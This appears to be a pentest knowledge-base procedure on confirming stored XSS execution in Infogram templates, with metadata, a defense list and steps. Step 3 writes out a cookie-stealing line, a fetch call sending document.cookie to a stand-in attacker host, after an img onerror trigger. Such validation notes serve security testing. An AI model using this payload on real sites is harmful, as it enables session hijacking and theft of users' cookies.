---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567893
name: Verify-XSS-Execution-in-Templates
tags:
  - xss
  - execution
  - verification
  - infogram
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.277Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-XSS-Execution-in-Templates

## Summary

This procedure verifies the execution of the stored XSS payload by loading the affected Infogram template, confirming arbitrary JavaScript runs in the viewer's browser context. It is essential for validating the vulnerability and assessing impact like session theft.

## Description

After injection, viewing the template renders the unsanitized payload, triggering JavaScript execution. In an attack, this could steal cookies via `document.cookie` or hijack sessions. The scenario targets any user loading the template; prerequisites include the injected template URL. Outcomes confirm control over the victim's client-side environment.

## Requirements

1. URL or access to the injected template
2. Authenticated session (attacker or victim perspective)
3. Browser with JS enabled

## Defense

Defensive measures and detection strategies:

- Deploy browser-side protections like XSS auditors or extensions
- Scan for and quarantine templates with suspicious JS patterns using WAF
- Educate users on phishing risks and monitor for anomalous browser behavior

## Objectives

1. Trigger payload execution on template load
2. Observe JS effects (e.g., prompt dialog)
3. Evaluate potential for data exfiltration

## Instructions

### Step 1: Load Template

**Context**: Navigate to the template to initiate rendering.

Open the template view URL in a browser, ensuring an authenticated session if required.

### Step 2: Monitor Execution

**Context**: Watch for payload trigger during page load.

As the page loads, the injected img tag's onerror should fire, executing prompt(0) and displaying a dialog box.

### Step 3: Confirm Impact

**Context**: Test for broader effects like cookie access.

Replace prompt(0) with `fetch('https://attacker.com?cookie='+document.cookie)` in a follow-up test to simulate exfiltration; check attacker server for received data.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Execution]]
- [[verification]]
- [[infogram]]
